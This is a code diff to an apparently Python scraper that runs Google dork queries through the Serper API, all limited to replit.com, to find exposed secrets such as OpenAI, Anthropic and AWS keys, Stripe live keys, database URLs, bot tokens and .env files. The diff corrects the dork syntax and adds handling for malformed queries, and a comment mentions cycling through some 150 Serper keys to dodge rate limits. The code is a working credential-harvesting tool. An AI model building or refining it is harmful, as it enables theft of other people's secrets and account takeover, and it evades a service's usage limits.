@@ -55,50 +55,51 @@ _LIMITS = httpx.Limits(max_connections=15, max_keepalive_connections=5, keepaliv
 
 
 # ── Google dork queries (all gated on site:replit.com) ─────────────────────
+# Critical: `filename:` is GitHub syntax, NOT Google. Use `inurl:` for path
+# matching. Quoted strings with `=` can also break serper parser — use
+# space-separated tokens instead.
 _DORKS = [
     # Replit-specific cred shapes
     'site:replit.com "REPLIT_DB_URL"',
     'site:replit.com "kv.replit.com/v0"',
     'site:replit.com "REPLIT_API_TOKEN"',
-    'site:replit.com "repl_" "API_TOKEN"',
-    # Major AI providers
-    'site:replit.com "OPENAI_API_KEY=sk-"',
-    'site:replit.com "ANTHROPIC_API_KEY=sk-ant-"',
-    'site:replit.com "GEMINI_API_KEY=AIzaSy"',
-    'site:replit.com "GOOGLE_API_KEY=AIzaSy"',
-    'site:replit.com "DEEPSEEK_API_KEY=sk-"',
-    'site:replit.com "GROQ_API_KEY=gsk_"',
-    'site:replit.com "REPLICATE_API_TOKEN=r8_"',
-    'site:replit.com "HF_TOKEN=hf_"',
-    'site:replit.com "HUGGINGFACE_TOKEN=hf_"',
-    'site:replit.com "XAI_API_KEY=xai-"',
-    'site:replit.com "MISTRAL_API_KEY="',
-    'site:replit.com "ELEVENLABS_API_KEY="',
-    'site:replit.com "OPENROUTER_API_KEY=sk-or-v1-"',
-    'site:replit.com "STABILITY_API_KEY=sk-"',
+    # Major AI providers — quote ONLY the prefix, not the assignment
+    'site:replit.com "OPENAI_API_KEY" "sk-"',
+    'site:replit.com "ANTHROPIC_API_KEY" "sk-ant-"',
+    'site:replit.com "GEMINI_API_KEY" "AIzaSy"',
+    'site:replit.com "GOOGLE_API_KEY" "AIzaSy"',
+    'site:replit.com "DEEPSEEK_API_KEY" "sk-"',
+    'site:replit.com "GROQ_API_KEY" "gsk_"',
+    'site:replit.com "REPLICATE_API_TOKEN" "r8_"',
+    'site:replit.com "HF_TOKEN" "hf_"',
+    'site:replit.com "HUGGINGFACE_TOKEN" "hf_"',
+    'site:replit.com "XAI_API_KEY" "xai-"',
+    'site:replit.com "MISTRAL_API_KEY"',
+    'site:replit.com "ELEVENLABS_API_KEY"',
+    'site:replit.com "OPENROUTER_API_KEY" "sk-or-v1-"',
+    'site:replit.com "STABILITY_API_KEY" "sk-"',
     # CN providers
-    'site:replit.com "ZHIPUAI_API_KEY="',
-    'site:replit.com "MOONSHOT_API_KEY=sk-"',
-    'site:replit.com "ARK_API_KEY="',
-    'site:replit.com "DASHSCOPE_API_KEY=sk-"',
-    'site:replit.com "QWEN_API_KEY="',
-    'site:replit.com "SILICONFLOW_API_KEY=sk-"',
+    'site:replit.com "ZHIPUAI_API_KEY"',
+    'site:replit.com "MOONSHOT_API_KEY" "sk-"',
+    'site:replit.com "ARK_API_KEY"',
+    'site:replit.com "DASHSCOPE_API_KEY"',
+    'site:replit.com "QWEN_API_KEY"',
+    'site:replit.com "SILICONFLOW_API_KEY"',
     # Infra
-    'site:replit.com "AKIA"',                   # AWS access key
-    'site:replit.com "DATABASE_URL=postgres"',
-    'site:replit.com "MONGODB_URI=mongodb"',
-    'site:replit.com "REDIS_URL=redis"',
+    'site:replit.com "AKIA"',                   # AWS access key prefix
+    'site:replit.com "DATABASE_URL" "postgres"',
+    'site:replit.com "MONGODB_URI" "mongodb"',
+    'site:replit.com "REDIS_URL" "redis"',
     'site:replit.com inurl:.env',
-    'site:replit.com filename:.env',
-    'site:replit.com filename:secrets.toml',
-    'site:replit.com filename:.replit',
+    'site:replit.com inurl:secrets.toml',
+    'site:replit.com inurl:.replit',
     # Bot tokens & integration
-    'site:replit.com "DISCORD_TOKEN="',
-    'site:replit.com "TELEGRAM_BOT_TOKEN="',
-    'site:replit.com "STRIPE_SECRET_KEY=sk_live_"',
-    'site:replit.com "TWILIO_AUTH_TOKEN="',
-    'site:replit.com "SUPABASE_KEY="',
-    'site:replit.com "PINECONE_API_KEY="',
+    'site:replit.com "DISCORD_TOKEN"',
+    'site:replit.com "TELEGRAM_BOT_TOKEN"',
+    'site:replit.com "STRIPE_SECRET_KEY" "sk_live_"',
+    'site:replit.com "TWILIO_AUTH_TOKEN"',
+    'site:replit.com "SUPABASE_KEY"',
+    'site:replit.com "PINECONE_API_KEY"',
 ]
 
 
@@ -157,8 +158,15 @@ async def _serper_search(client: httpx.AsyncClient, query: str,
                 last_err = f"serper 429 on key {key[:8]}"
                 # 429 is per-key — try next
                 continue
+            if r.status_code == 400:
+                # Bad request = malformed query, NOT auth issue. Trying other
+                # keys won't help. Log + abort for this query (don't waste 150
+                # keys' rate budget on a single broken dork).
+                log.warning("[replit] serper 400 BAD QUERY %r — body: %s",
+                            query[:80], r.text[:160])
+                return []
             if r.status_code != 200:
-                last_err = f"serper status={r.status_code} body={r.text[:120]}"
+                last_err = f"serper status={r.status_code} body={r.text[:160]}"
                 continue
             data = r.json()
             organic = data.get("organic", [])
